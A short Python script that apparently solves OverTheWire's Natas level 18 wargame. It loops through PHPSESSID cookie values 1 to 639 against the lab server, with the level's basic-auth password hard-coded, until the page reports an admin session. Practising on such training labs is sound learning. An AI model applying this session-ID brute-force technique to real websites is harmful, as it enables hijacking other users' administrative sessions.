import requests, time


user = "natas18"
password ="xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"
sess_id = 1
payload = {'username': '1', 'password': '1'}


for x in range(1, 640):
     cookie = dict(PHPSESSID='{}'.format(x))
     req = requests.post('http://natas18.natas.labs.overthewire.org/index.php?debug=true',
             auth = (user, password),
             cookies = cookie,
             
             )
     print("PHPSESSID is currently: {}".format(x))
     if("You are an admin." in req.content):
         print(req.content)



